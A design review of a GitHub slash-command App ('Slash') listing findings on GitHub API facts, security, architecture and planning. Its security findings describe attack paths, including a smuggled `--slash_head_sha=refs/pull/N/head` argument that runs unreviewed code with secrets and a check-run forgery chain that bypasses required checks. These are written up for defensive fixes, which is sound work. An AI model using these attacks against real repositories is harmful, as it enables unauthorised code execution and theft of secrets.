# Slash 0.0.1 — Design Review

Date: 2026-08-03
Subject: revision 1 of [`0.0.1-spec.md`](./0.0.1-spec.md) and
[`0.0.1-implementation-plan.md`](./0.0.1-implementation-plan.md)
References studied: [kubernetes-sigs/prow](https://github.com/kubernetes-sigs/prow),
[jenkins-x/lighthouse](https://github.com/jenkins-x/lighthouse)

Method: four readers studied the corresponding subsystems of the two reference
implementations; four adversarial reviewers attacked the spec from the GitHub
platform-fact, security, distributed-systems, and product/plan angles;
high-severity findings were then re-checked by independent agents whose goal was
to refute them. 50 findings, none refuted. The full list is in the appendix.

This document is kept because it records *why* revision 2 of the spec looks the
way it does. Section numbers in the body below refer to **revision 1** of the
spec; the appendix findings likewise cite revision 1.

---

## Verdict

The direction and most of the technical judgment were right, and three decisions
in particular are validated by counter-examples in the reference
implementations — reading `.slash/` only from the default branch, targeting
github.com only, and using the Checks API rather than commit statuses. Those
should not be revisited.

But revision 1 had **one chapter that had to be rewritten wholesale**, **five
platform-fact errors** (one of which would have made the product receive nothing
at all), **four security defects**, and **one architectural orientation problem**.

## 1. §6.3 was obsolete: `workflow_dispatch` now returns the run ID

The single most valuable finding, verified directly against GitHub:

- [Changelog, 2026-02-19](https://github.blog/changelog/2026-02-19-workflow-dispatch-api-now-returns-run-ids/):
  a new optional `return_run_details: true` parameter makes the endpoint return
  200 with the run's ID, API URL, and HTML URL.
- From API version `2026-03-10` this is the default; the parameter is no longer needed.
- The [current REST reference](https://docs.github.com/en/rest/actions/workflows?apiVersion=2022-11-28)
  documents 200 with `workflow_run_id` / `run_url` / `html_url` as the response.

Revision 1 §6.3 was built entirely on "POST workflow_dispatch returns no run ID",
which is no longer true. Consequences:

- The three-strategy correlation ladder (run-name convention → heuristic claim →
  polling) is no longer the primary path. The run ID goes into the invocation row
  at dispatch time and every `workflow_run` webhook matches on it exactly.
- The `slash_run_id` reserved input and the mandatory
  `run-name: "slash:${{ inputs.slash_run_id }}"` convention are no longer
  correlation requirements. That convention was a steep onboarding step —
  users had to declare three reserved inputs *and* write a `run-name`.
- The heuristic claim and polling become fallbacks for the case where the
  dispatch response carries no run details, cutting the M6 workload and risk.
- It removes both the "concurrent identical dispatches may cross-correlate"
  limitation §6.3 admitted, and the check-run forgery attack that the
  `display_title` substring match enabled (appendix B#3).

It also reordered the plan: the correlation spike is the riskiest unvalidated
assumption in the product and was sequenced *last*. It needs none of the code
from M0–M5 — a scratch repo, `curl`, and a webhook capture answer every question
in a day, and doing it first is what surfaced this change.

## 3. Security defects

1. **Injected inputs were user-overridable** (appendix B#4). §5 specified
   `inputs = reserved + args` — user args applied last, so they win — and nothing
   forbade `--slash_head_sha=...`. Since §4.2 established `slash_head_sha` as the
   sanctioned way for a workflow to know what to check out,
   `/deploy --slash_head_sha=refs/pull/N/head` would run an unreviewed fork's code
   inside a same-repo, full-secret run. Fixed by reserving the `slash_` prefix in
   three independent places and merging injected inputs last (spec §5.4).

2. **The `author_association` fast path was an unsound allow** (appendix B#2).
   `COLLABORATOR` is returned for read-only collaborators and `MEMBER` for org
   members with no repository grant. The clause was also self-contradictory: if
   the API call is always authoritative, the fast path accelerates nothing. Prow
   never uses `author_association` for authorization. Now a deny-filter only.

3. **`permission: read`/`triage` were configurable with no validation or warning**
   (appendix B#1). On a public repository that would let any GitHub user trigger,
   with attacker-chosen argument values, an unreviewed head-branch workflow
   holding the repository's secrets — silently voiding §5.1's entire trust
   argument. Now rejected at config validation.

4. **Argument values flowed unchecked into `${{ inputs.x }}`** (appendix B#5).
   This is Slash's product shape — free text becomes workflow inputs — so the
   mitigation has to be Slash's, not the tenant's. Now a default-deny charset with
   a `free_text: true` opt-out, and example workflows that pass values via `env:`.

Related: §5.1's claim of "the same trust model as Prow" was **inaccurate**. Prow
has two independent trust axes (commenter trust plus PR-content trust via
`ok-to-test`) and runs jobs on isolated, secretless infrastructure. Slash has only
the commenter axis. That is sound for 0.0.1, but only because of an invariant the
spec never stated: same-repo branches can only be pushed by write+ users, so
content trust is implied by repository mechanics. It is the load-bearing wall, and
it evaporates the moment fork PRs arrive — so revision 2 states it explicitly.

## 4. Architecture: edge-triggered was the biggest structural risk

The most important lesson from reading both reference implementations:

**Prow and Lighthouse are both "one durable record plus level-triggered
reconciliation". Revision 1 of Slash was purely event-driven.** Prow's `crier`
does not replay events; it reconciles the current state of the `ProwJob` record,
and Lighthouse's `foghorn` does the same over `LighthouseJob`. That distinction is
not a style preference — it decides whether three classes of bug are structurally
absent or have to be patched one at a time:

- **Lost events** (appendix C#1): crashing after `enqueue in-process → 200` loses
  the command permanently, and GitHub never redelivers. The worst window is that
  §5 created the check run (`queued`) *before* persisting the invocation, leaving
  a check run that will never be updated — and permanently blocking any PR that
  requires it.
- **Idempotency was unimplementable** (appendix C#2): the §7.2 table had neither
  `comment_id` nor a delivery GUID, and its primary key was a fresh UUIDv4 per
  processing attempt — no unique key to upsert against. One manual redelivery
  meant a duplicate dispatch, i.e. a second deploy.
- **Timer ownership** (appendix C#3): the 60s/10min fallbacks could only be
  in-process timers on the replica that dispatched. Lose that replica and the
  invocation sits in `dispatched` forever with its check run stuck at `queued`.
  This makes §7.1's "horizontal scale-out safe" false as written.
- **Out-of-order events** (appendix C#4): GitHub guarantees no ordering. A
  `completed` arriving first, or a redelivered `in_progress`, would move the check
  run back from completed to `in_progress` under §5's direct event-to-mutation
  mapping — and there it would stay.

One root cause, one affordable fix, now in spec §7.2/§7.3:

1. **Transactional inbox** — insert the raw delivery (unique on
   `X-GitHub-Delivery`) inside the request handler, *then* return 200; workers
   consume with `FOR UPDATE SKIP LOCKED`. Postgres becomes the `ProwJob` analog.
2. **One sweeper worker** on every replica, coordinated by `SKIP LOCKED` so it
   needs no leader election, owning every timeout: correlation fallback, the
   10-minute dispatch deadline, the run deadline for `correlated` invocations
   (revision 1 had no such timeout at all, so a lost completion event meant a
   permanently `in_progress` check run), and retrying failed check-run updates.
3. **Guarded compare-and-swap transitions**, with check-run calls derived from
   post-transition database state rather than from the payload.
4. **Schema columns revision 1 lacked**: `comment_id` (+ unique constraint as the
   idempotency key), `completed_at`, `conclusion` separate from lifecycle status,
   `failure_reason`, `last_reported_status` (Prow's `PrevReportStates` analog, for
   monotonic updates), `actor` (§6.2 wanted to display it but nothing stored it),
   a unique constraint on `workflow_run_id`, a `superseded` terminal state, and a
   retention policy — never deleting non-terminal rows on age alone, but first
   driving them through their timeout transition so the check run reaches a
   terminal state (Prow's `sinker` invariant).

## 5. Product and plan

- **Required status checks are double-edged** (appendix D#1). §2.1 sold it as the
  headline feature without stating the consequences: a PR where nobody runs the
  command stays `Expected` forever, and because required checks evaluate on the
  head commit while Slash reports on the SHA captured at invocation, **every push
  requires re-issuing the command** (Prow re-runs presubmits on `synchronize`).
  Now documented as a caveat with the Re-run button as the mitigation.
- **Unknown commands would have spammed** (appendix D#2). The gate was only
  "first line starts with `/`", so `/etc/nginx.conf is wrong`, `/cc @alice` (Prow
  muscle memory) and `/api/v2 ...` would each draw a bot error comment. Prow and
  Lighthouse never reply to unrecognized slash text. For an org-wide bot this is a
  real adoption risk.
- **The Re-run button would have been a dead control** (appendix D#5). GitHub
  renders it on App-created check runs and delivers `check_run.rerequested`, which
  revision 1 did not subscribe to. Inverted, this is an opportunity: the
  invocation row already stores everything a re-run needs, so implementing it is a
  small delta that delivers the `/retest`-shaped feature — which is exactly the
  antidote to the required-check pain above.
- **Correlation was sequenced last** (appendix D#3), despite being the load-bearing
  and only genuinely unknown mechanism. Now M0.5, before any code, producing the
  real payload fixtures the plan already wanted.
- **No dogfooding** (appendix D#8): first contact with real GitHub behavior was
  M7, with M3–M6 tested against hand-written assumptions. Slash's own repository
  is a zero-risk tenant; dogfooding is now an M5 exit criterion.
- **Metrics should not all be deferred** (appendix C#10): every failure mode of
  this architecture is silent, and the DoD's "webhook p99 < 1s" cannot be measured
  without them. A `/metrics` endpoint with a handful of counters now ships in M4.
- **Config errors surfaced only at invocation time** (appendix D#10): whoever
  breaks the config on the default branch is not who sees the error, possibly days
  later. 0.0.1 ships a `slash validate` CLI for tenant CI; a `slash/config` check
  run on push is the planned follow-up.

## 6. Decisions confirmed — do not revisit

These look like places to "improve" and are not; each has a counter-example in
the reference implementations.

- **`.slash/` read only from the default branch.** Lighthouse's in-repo config is
  main-first *merged with the event ref*, so a PR can alter its own triggers,
  guarded only by the TrustedUser/`ok-to-test` gate. Meanwhile Lighthouse's
  `keeper` deliberately reads main only when making *merge* decisions. Slash's
  hybrid — security policy from the default branch, execution body from the PR
  head — is strictly safer, because the `permission` field and argument schema can
  never be modified by the PR under test. Revision 2 does now name the asymmetry:
  the `workflow:` file itself comes from the PR head, so a write user's PR can
  change what `/deploy` *does*, just not *who may invoke it*.
- **github.com only, with native App auth.** Lighthouse paid for its multi-SCM
  abstraction (`go-scm`) by losing the Checks API — it reports plain commit
  statuses. Slash's entire value proposition (check runs on the head SHA, usable
  as required checks, with live lifecycle transitions) depends on Checks features
  `go-scm` cannot express uniformly.
- **A permission tier per command.** Prow's trust is binary because its jobs run
  on isolated, secretless infrastructure; Slash's execution plane inherits
  repository secrets, so gating by level is a necessary adaptation rather than a
  divergence. Making it repo-configurable YAML is a clean generalization of Prow's
  hardcoded per-plugin tiers.
- **First-line-only parsing.** Prow's any-line matching costs code-block
  stripping, HTML-comment stripping, and per-plugin deduplication — and still
  misfires inside fenced blocks (only the `trigger` plugin strips them).
  First-line-only removes the whole class at zero cost. The one gap worth closing
  was the silent drop, now handled by scanning remaining lines for *configured*
  command names (spec §3.2).

### A. GitHub platform facts (api-correctness)

#### 1. [HIGH] App manifest lacks Issues permission: cannot subscribe to issue_comment webhooks or create reactions

*spec section*: 7.4 (also 7.3, 6.4)

**Problem**: The spec 7.4 manifest (checks:write, actions:write, contents:read, pull_requests:write, metadata:read) is insufficient. (a) Subscribing to the issue_comment webhook — the event that carries every PR slash command — requires the Issues repository permission: docs state 'To subscribe to this event, a GitHub App must have at least read-level access for the "Issues" repository permission.' pull_requests:write does not grant it. (b) Creating reactions on PR comments (which are issue comments) via POST /repos/{owner}/{repo}/issues/comments/{comment_id}/reactions requires Issues write; in the permissions-required-for-github-apps reference this endpoint appears ONLY under 'Repository permissions for Issues' (the Pull requests section only lists /pulls/comments/... review-comment reactions). With the current manifest the App would receive no comment events at all and could not add the 🚀/😕 reactions. Note POST /repos/{owner}/{repo}/issues/{issue_number}/comments (creating comments) IS listed under both Issues and Pull requests, so commenting alone would work with pull_requests:write.

**Evidence**: https://docs.github.com/en/webhooks/webhook-events-and-payloads#issue_comment ('a GitHub App must have at least read-level access for the Issues repository permission'); https://docs.github.com/en/rest/authentication/permissions-required-for-github-apps?apiVersion=2022-11-28 (POST /repos/{owner}/{repo}/issues/comments/{comment_id}/reactions listed only under Issues, write; POST /repos/{owner}/{repo}/issues/{issue_number}/comments listed under both Issues and Pull requests)

**Recommendation**: Add issues:write to the spec 7.4 manifest (write covers both the webhook subscription and comment-reaction creation). Keep pull_requests:write for reading PR head data (pull_request webhook, GET pull). Add an M3 integration/E2E check that reactions succeed with the final manifest.

#### 2. [HIGH] Collaborator permission endpoint's 'permission' field cannot express the 5-level model; must use role_name

*spec section*: 5.2 (and 4.1 permission enum)

**Problem**: Spec 5.2 says to resolve the comment author's permission via GET /repos/{owner}/{repo}/collaborators/{username}/permission for the 5-level gate read|triage|write|maintain|admin (4.1). But the response's top-level 'permission' field only returns legacy roles: 'admin, write, read, and none, where the maintain role is mapped to write and the triage role is mapped to read.' Using it, a user with triage appears as read (wrongly denied for permission: triage) and a user with maintain appears as write (wrongly denied for permission: maintain — effectively only admins could ever pass a maintain gate). The exact role is only available in the response's user.role_name attribute ('The role_name attribute provides the name of the assigned role, including custom roles'), which additionally may return arbitrary custom role names that need a fallback mapping (e.g. via user.permissions booleans).

**Evidence**: https://docs.github.com/en/rest/collaborators/collaborators?apiVersion=2022-11-28#get-repository-permissions-for-a-user — 'The permission attribute provides the legacy base roles of admin, write, read, and none, where the maintain role is mapped to write and the triage role is mapped to read.' Endpoint is available to the App via metadata:read (permissions-required-for-github-apps lists it under Metadata, read — so the spec's metadata:read suffices for the call itself).

**Recommendation**: Amend spec 5.2 to require reading user.role_name (not permission) and define handling for custom role names (map via user.permissions booleans to the nearest base role, or treat unknown roles conservatively). Add M3 tests with fixture responses for triage, maintain, and a custom role.

#### 3. [HIGH] Correlation premise outdated: workflow_dispatch API now returns the run ID directly

*spec section*: 6.3 (also 4.2 reserved inputs, 5, 7.2)

**Problem**: Spec 6.3's foundational claim 'POST workflow_dispatch returns no run ID' is no longer true. Since 2026-02-19, POST /repos/{owner}/{repo}/actions/workflows/{workflow_id}/dispatches accepts return_run_details: true and returns 200 with the dispatched run's ID, API URL, and HTML URL (previously 204 No Content); from API version 2026-03-10 this response is the default. The current REST reference already documents the 200 'Response including the workflow run ID and URLs'. This obsoletes the three-strategy correlation ladder (run-name convention, heuristic claim, polling) as the primary mechanism, and removes the need for the slash_run_id reserved input and the user-facing run-name: "slash:${{ inputs.slash_run_id }}" convention as correlation requirements — a major simplification of spec 6.3, 4.2, and the M6 milestone.

**Evidence**: https://github.blog/changelog/2026-02-19-workflow-dispatch-api-now-returns-run-ids/ ; https://docs.github.com/en/rest/actions/workflows?apiVersion=2022-11-28#create-a-workflow-dispatch-event (documents 200 response including the workflow run ID and URLs); https://github.com/orgs/community/discussions/9752 (the long-standing gap this closed)

**Recommendation**: Rewrite spec 6.3: primary correlation = run ID from the dispatch response (store workflow_run_id at dispatch time); keep workflow_run webhooks for status sync keyed by run ID, and demote heuristic/polling to a fallback only if the dispatch response lacks details (e.g. older API version pinning, or verify octocrab support and pin X-GitHub-Api-Version accordingly). Reconsider whether slash_run_id/slash_pr_number/slash_head_sha reserved inputs remain required (they still add user value inside the workflow, but forcing all three raises the workflow-authoring bar and every input eats into limits); at minimum drop the run-name requirement.

#### 4. [MEDIUM] workflow_dispatch inputs limit is 25, not 10

*spec section*: 4.1 (validation rules), 4.2

**Problem**: Spec 4.1 states 'Total inputs (user args + reserved inputs) must not exceed the workflow_dispatch limit of 10'. Current GitHub docs state the limit is 25 top-level input properties (plus a 65,535-character total payload limit the spec does not mention). Validating against 10 would wrongly reject valid configurations with 8+ user args (after 3 reserved inputs).

**Evidence**: https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#workflow_dispatch and https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax — 'The maximum number of top-level properties for inputs is 25. The maximum payload for inputs is 65,535 characters.' The REST dispatch endpoint's inputs parameter likewise documents 'The maximum number of properties is 25.'

**Recommendation**: Change the spec 4.1 validation rule and the M2 exit criterion ('≤ 10 total inputs') to 25 total inputs, and add validation of the 65,535-character serialized inputs payload limit at dispatch time.

#### 5. [MEDIUM] Workflow file must exist on the default branch to be dispatchable; new workflows added only in a PR cannot be triggered

*spec section*: 5.1 (also 2.3, 8)

**Problem**: Spec 5.1 says 'The workflow file and code both come from the PR head branch' with a 'test this PR' rationale ('a PR's changes to its own workflow are exercised'). This is only half-true: GitHub docs state 'This event will only trigger a workflow run if the workflow file exists on the default branch.' Dispatch resolves {workflow_id}/filename against workflows registered from the default branch; a workflow file that exists only on the PR head branch returns 404 and cannot be dispatched. So: modifications in a PR to an already-registered workflow run the PR-branch version (spec's rationale holds), but a brand-new workflow introduced by the PR — or a command whose .slash mapping points at a not-yet-merged workflow — fails, and the spec never documents this constraint.

**Evidence**: https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#workflow_dispatch — 'This event will only trigger a workflow run if the workflow file exists on the default branch.' Community confirmation of the 404-until-merged behavior: https://blog.infra.kiwi/gha-when-i-define-a-workflow-with-workflow-dispatch-i-cannot-invoke-it-49e364f2ed4d

**Recommendation**: Document in spec 5.1/8 and user docs: the workflow referenced by a .slash command must exist (with workflow_dispatch trigger) on the default branch; PR-branch versions of an existing workflow are what run. Map the resulting 404 to a user-facing message explaining 'workflow not found on default branch' rather than a generic API error.

#### 6. [MEDIUM] GitHub does not automatically redeliver webhooks; spec's redelivery/idempotency premise is inverted

*spec section*: 7.2 (also 8, 2.2 'never silently dropped')

**Problem**: Spec 7.2 says 'Webhook processing must be idempotent (GitHub redelivers)' and 8 lists 'GitHub webhook redelivery' as a must-handle, implying GitHub retries failed/timed-out deliveries. Docs are explicit: 'GitHub does not automatically redeliver failed deliveries.' Redelivery is manual only (UI or REST, within a 3-day window). Idempotency remains good practice (manual redeliveries reuse the same X-GitHub-Delivery GUID), but the real reliability risk is the opposite of the spec's premise: any delivery lost during downtime is gone unless Slash actively recovers it. A lost issue_comment event means a silently dropped command, contradicting design principle 2.2; a lost workflow_run event is covered by the 6.3 polling fallback only.

**Evidence**: https://docs.github.com/en/webhooks/testing-and-troubleshooting-webhooks/redelivering-webhooks — 'GitHub does not automatically redeliver failed deliveries.'; https://docs.github.com/en/webhooks/using-webhooks/best-practices-for-using-webhooks — 'If your server goes down, you should redeliver missed webhooks once your server is back up' and 'Your server should respond with a 2XX response within 10 seconds of receiving a webhook delivery' (the 10s figure in spec 7.3 is correct).

**Recommendation**: Fix the 7.2 wording (idempotency guards against manual redelivery and horizontal-scale races, not automatic retries) and add a recovery story: on startup/periodically, use the app-webhook deliveries REST API to list and request redelivery of failed deliveries (3-day window), or explicitly document missed-command loss as an accepted 0.0.1 limitation.

#### 7. [LOW] Conclusion mapping omits 'stale' and null workflow_run conclusions

*spec section*: 6.2

**Problem**: The 6.2 mapping table handles success/failure/cancelled/timed_out/action_required/skipped/neutral/startup_failure but the workflow_run conclusion enum also includes 'stale' (and null while not completed). Additionally, integrators cannot set a check run conclusion to 'stale' (only GitHub can), so if a pass-through mapping were ever attempted for it, the Checks API would reject it. Unmapped values would hit an undefined code path in M6.

**Evidence**: https://docs.github.com/en/webhooks/webhook-events-and-payloads#workflow_run (conclusion enum includes stale/null); https://docs.github.com/en/rest/checks/runs?apiVersion=2022-11-28 (update check run conclusion note that 'stale' can only be set by GitHub)

**Recommendation**: Add a catch-all row to 6.2: stale and any unknown/future conclusion map to failure (or neutral) with the raw conclusion echoed in the check-run summary; assert exhaustive matching in M6 tests.

#### 8. [LOW] Native GitHub Actions job check runs will appear on the PR alongside slash/<command> (undocumented duplication)

*spec section*: 6.1 (also 2.1 step 5, user docs in M7)

**Problem**: A dispatched run executes at the PR head branch tip, so its head_sha equals the PR head SHA; GitHub Actions 'generates checks, not commit statuses, when workflows are run', and those job-level check runs attach to that SHA and therefore show in the PR checks UI next to Slash's own slash/<command> check run. The spec never mentions this duplication, and users could mistakenly mark the native job check (which for workflow_dispatch runs of other branches may be absent or differently named) as the required check instead of slash/<command>. Same-name/required-check semantics themselves are safe for Slash's design: for required status checks GitHub considers only the most recent check run per name on the commit, so re-invocations creating a fresh slash/<command> run behave as intended (latest wins).

**Evidence**: https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/collaborating-on-repositories-with-code-quality-features/about-status-checks ('GitHub Actions generates checks, not commit statuses, when workflows are run'); https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/collaborating-on-repositories-with-code-quality-features/troubleshooting-required-status-checks (check suite status based on the last check run created under each name; required checks evaluated against the latest commit SHA)

**Recommendation**: Add a note to spec 6.1 and the M7 user docs: the workflow's own job checks will also appear on the PR; instruct users to require slash/<command> (optionally disambiguated by app in branch protection) and confirm the duplication UX during M7 E2E.

#### 9. [LOW] 422-on-undeclared-inputs is community-confirmed but not in the REST reference; verify exact error surface in M3

*spec section*: 4.2 (also 8)

**Problem**: Spec 4.2's claim that 'GitHub rejects dispatches carrying undeclared inputs (HTTP 422)' is behaviorally correct (422 'Unexpected inputs provided', with related 422s for missing required/invalid choice inputs, and 404 for missing workflow / 422 'Workflow does not have workflow_dispatch trigger' per spec 8), but the official REST reference documents neither the 422 nor the 404 explicitly for this endpoint — the behavior is confirmed only via community reports and client-library issues, so error-message wording is not contractual.

**Evidence**: https://docs.github.com/en/rest/actions/workflows?apiVersion=2022-11-28#create-a-workflow-dispatch-event (no 404/422 documented); community confirmations: https://github.com/hub4j/github-api/issues/1265, https://github.com/cli/cli/issues/5246, https://github.com/orgs/community/discussions/27262

**Recommendation**: Keep the design but treat GitHub 4xx bodies as opaque: surface status code + message verbatim in the check-run summary rather than pattern-matching wording; record real 422/404 fixtures during M3/M7 E2E for the wiremock tests.

#### 10. [LOW] Fork-ref claim (2.4) is correct by construction but has no explicit docs statement; confirm in E2E

*spec section*: 2.4

**Problem**: Spec 2.4's 'workflow_dispatch cannot target a fork ref' could not be matched to an explicit sentence in GitHub docs. It is correct by construction: the dispatch ref 'can be a branch or tag name' of the repository the API call targets, and a fork PR's head branch exists only in the fork repository (the hidden refs/pull/N/head refs are not branches or tags), so dispatching in the base repo cannot reference it. No doc says this in so many words.

**Evidence**: https://docs.github.com/en/rest/actions/workflows?apiVersion=2022-11-28#create-a-workflow-dispatch-event — ref: 'The git reference for the workflow. The reference can be a branch or tag name.'

**Recommendation**: Keep the non-goal as written; add one M7 E2E case (comment from a fork PR) verifying the guard fires on head.repo != base.repo before any dispatch attempt, and that refs/pull/N/head is never used as a dispatch ref.

#### 11. [LOW] Late check-run updates (hours after creation) have no documented time limit; verify in M3

*spec section*: 6 (checks lifecycle), 8

**Problem**: The spec assumes the App can update its check run whenever the workflow completes (potentially hours later, e.g. long deploys or the 10-minute polling fallback plus queue delays). The Checks API docs document no expiry or time limit on PATCH /repos/{owner}/{repo}/check-runs/{check_run_id}, and confirm write access to checks is GitHub-Apps-only and external_id is 'A reference for the run on the integrator's system' (spec 6.1 usage is correct); the only documented constraint found is 'In a check suite, GitHub limits the number of check runs with the same name to 1000' (irrelevant at Slash's scale). Absence of a documented limit is not positive confirmation of unlimited-late updates.

**Evidence**: https://docs.github.com/en/rest/checks/runs?apiVersion=2022-11-28 — external_id description, 1000-same-name limit, 'Write permission for the REST API to interact with checks is only available to GitHub Apps.' No update-window limitation documented.

**Recommendation**: During M3/M7, verify a check run created queued can still be moved to completed after a multi-hour delay (and after the underlying check suite has other completed runs); if any staleness behavior appears, fall back to creating a fresh slash/<command> check run on completion (same-name latest-wins makes this safe for required checks).

### B. Security (security)

#### 12. [HIGH] Trust gate is on the commenter only; the code being executed is never trusted (no ok-to-test / trusted-PR equivalent) **[independently re-checked]**

**Problem**: Spec §5.2 gates only the comment author and §5.1's "same trust model as Prow" is imprecise (Prow additionally admits untrusted commenters via a trusted-PR/ok-to-test gate and runs jobs on its own infrastructure). However, because §2.4/§5 restrict dispatch to same-repo head branches and GitHub only lets write+ collaborators push branches, all executable workflow YAML is necessarily authored by write+ users — an unprivileged actor cannot achieve pwn-request-style arbitrary code execution. The real residual gap (medium severity): §4.1 allows `permission: read`/`triage` (the API's legacy permission field maps triage to read) with no validation or warning, which silently voids §5.1's stated "write default gate" rationale — on a public repo, any GitHub user could then trigger, at will and with attacker-chosen input values (a command-injection surface if workflows interpolate inputs into run: steps), unreviewed write-authored head-branch workflows running with full repository secrets (e.g. drive-by `/deploy production` on someone else's open PR). Fix: reject or loudly warn on read/triage-gated dispatching commands (or require an explicit opt-in), and document that a command's `permission` tier grants the ability to execute unreviewed head-branch versions of workflows with repo secrets, recommending Environment protection rules for sensitive workflows.

**Evidence**: Spec §5.1: "The workflow file and code both come from the **PR head branch** (`ref` = head branch name) ... The `write` default permission gate makes this acceptable (same trust model as Prow)." The claim of parity with Prow is incorrect. Prow gates on BOTH actor and PR: D:/git/GitHub/HenryZhang-ZHY/slash_workspace/prow/pkg/plugins/trigger/generic-comment.go lines 71-95 — if the commenter is untrusted it falls through to `TrustedPullRequest(...)` (D:/git/GitHub/HenryZhang-ZHY/slash_workspace/prow/pkg/plugins/trigger/pull-request.go:365-381), which requires the *PR author* to be trusted or the PR to carry the `ok-to-test` label, and otherwise replies "Cannot trigger testing until a trusted user reviews the PR and leaves an `/ok-to-test` message." Prow additionally constrains untrusted in-repo config with an allowlist (`allowed_clusters`, D:/git/GitHub/HenryZhang-ZHY/slash_workspace/prow/site/content/en/docs/inrepoconfig.md:41-46) and runs jobs in its own sandbox, not with the repo's secrets. GitHub docs confirm the head-branch YAML is what executes: the workflow file must exist on the default branch to register the trigger, but "the workflow file from the selected branch is the one that's run" (https://docs.github.com/en/actions/how-tos/manage-workflow-runs/manually-run-a-workflow). Spec §4.1 permits `permission: read`; §2.4 excludes forks, so the head branch is in the base repo and the run is a full-trust same-repo run.

**Recommendation**: (1) Forbid `permission: read` and `permission: triage` for any command that dispatches — reject at config validation with an explicit error, or require an opt-in `allow_untrusted_actors: true` that is only honored together with a PR-trust gate. (2) Add a PR-trust gate independent of the actor gate: dispatch only if the PR author is a collaborator with write+, or a write+ user has left an explicit `/ok-to-test`-style approval on the current head SHA (invalidated on force-push). (3) Add a config-level `require_reviewed_workflow: true` (default true) that refuses to dispatch when the PR diff touches `.github/workflows/**` or `.github/actions/**` unless a write+ user approved that exact head SHA. (4) Document loudly that Slash grants the command's `permission` tier the ability to run head-branch code with repository secrets, and recommend tenants put sensitive workflows behind GitHub Environment protection rules with required reviewers.

#### 13. [HIGH] `author_association` fast-path allow lets read-only collaborators and org members bypass the `write` gate **[independently re-checked]**

**Problem**: §5.2 permits `author_association` ∈ {OWNER, MEMBER, COLLABORATOR} as a "fast-path allow". Two of the three values are satisfiable without write access: `COLLABORATOR` is returned for read-only and triage collaborators (GitHub defines it merely as "invited to collaborate on the repository", at any permission tier), and `MEMBER` is returned for any member of the owning organization even when that member has no repo-level grant beyond public read (only OWNER — the repository owner, who necessarily has admin — is a sound allow). A read-only collaborator or permissionless org member can therefore invoke a `permission: write` command, which — chained with findings #1 and #4 — yields arbitrary code execution with the repo's secrets. The clause "but the API call is authoritative" is self-contradictory: if the authoritative call is always made, the fast path grants nothing and should be deleted; if it is skipped on a fast-path hit (the only way it is a "fast path"), the gate is bypassed. Separately, because the permission endpoint's legacy `permission` attribute collapses maintain→write and triage→read, the spec's five-tier `permission:` field also requires explicit normalization or use of the response's `role_name` field.

**Evidence**: Spec §5.2: "`author_association` from the webhook payload may be used as a fast-path allow for `OWNER`/`MEMBER`/`COLLABORATOR`, but the API call is authoritative." GitHub's own mapping documents that the permission API's legacy roles collapse tiers — "the maintain role is mapped to write and the triage role is mapped to read" (https://docs.github.com/en/rest/collaborators/collaborators) — i.e. `COLLABORATOR` association spans read/triage/write/maintain/admin and carries no permission information. Prow never uses `author_association` as an allow; it resolves trust only through `IsMember` / `IsCollaborator` API calls (D:/git/GitHub/HenryZhang-ZHY/slash_workspace/prow/pkg/plugins/trigger/trigger.go:245-308) and makes org-membership-as-trust an explicit per-repo config decision (`OnlyOrgMembers`, `TrustedOrg`), not an implicit override of a configured tier.

**Recommendation**: Delete the fast-path allow from §5.2. `author_association` may only be used as a cheap *deny* filter (e.g. skip processing for `NONE`/`FIRST_TIME_CONTRIBUTOR` before spending API calls), never as an allow. Make the permission API result the sole allow decision, and normalize it explicitly: treat `triage` as `read` and `maintain` as `write` per GitHub's documented mapping, and add a unit test asserting that a `COLLABORATOR`/`MEMBER` association with API permission `read` is denied a `write`-gated command.

#### 14. [HIGH] Check-run conclusion forgery via substring correlation on `display_title`: required-status-check bypass by any outside contributor

**Problem**: §6.3 strategy 1 correlates an invocation to a workflow run "if the run's `display_title`/`name` contains `slash:<uuid>`". `display_title` is attacker-controllable in essentially every repo, and the `<uuid>` is public, not secret. An attacker with no repository access at all can therefore complete another user's pending `slash/<command>` check run with `conclusion: success`. Chain: (a) a maintainer comments `/deploy`; (b) the attacker reads the UUID — it is published verbatim as the run title in the Actions tab by the recommended `run-name: "slash:${{ inputs.slash_run_id }}"`, and is also returned as `external_id` on the check run to anyone with read access; (c) the attacker opens a fork PR titled `slash:<uuid>` (or with a commit message / branch name containing it); (d) the base repo's ordinary `pull_request` CI produces a `workflow_run` whose `display_title` is that PR title, completing `success` in seconds; (e) Slash's substring match claims it and flips `slash/deploy` to success while the real deploy is still running or has failed. If `slash/deploy` is a required status check — which §2.1 sells as the headline feature — branch protection is bypassed. Strategy 2 has the same shape with a wider net: its predicate (repo, workflow file, event, branch, created_at window) contains nothing that distinguishes a run Slash dispatched from one a human dispatched, so any write-access user can pre-empt or steal a claim by pressing "Run workflow" in the UI.

**Evidence**: Spec §6.3.1: "if the run's `display_title`/`name` **contains** `slash:<uuid>`, correlate exactly" (substring, not equality, and not authenticated). Spec §6.1: "`external_id`: the invocation UUID" — GitHub docs confirm `external_id` is returned by "Get a check run" and "List check runs for a Git reference" (https://docs.github.com/en/rest/checks/runs), so the correlation token is readable by any user with read access. `run-name` is expression-driven and GitHub's own canonical example interpolates untrusted values: "This value can include expressions and can reference the `github` and `inputs` contexts", example `run-name: Deploy to ${{ inputs.deploy_target }} by @${{ github.actor }}` (https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#run-name). When `run-name` is absent, "the run name is set to event-specific information" — for `pull_request` runs that is the PR title, for pushes the commit message; both are fully attacker-authored. Note the one real protection this bypasses: check runs are owned by the creating App, so only Slash can complete a `slash/*` check ("Write permission for the REST API to interact with checks is only available to GitHub Apps", https://docs.github.com/en/rest/checks/runs) — which is exactly why confusing Slash's correlation is the whole attack. Also: §6.3 trusts the webhook payload's `conclusion` and `display_title` without ever re-reading the run.

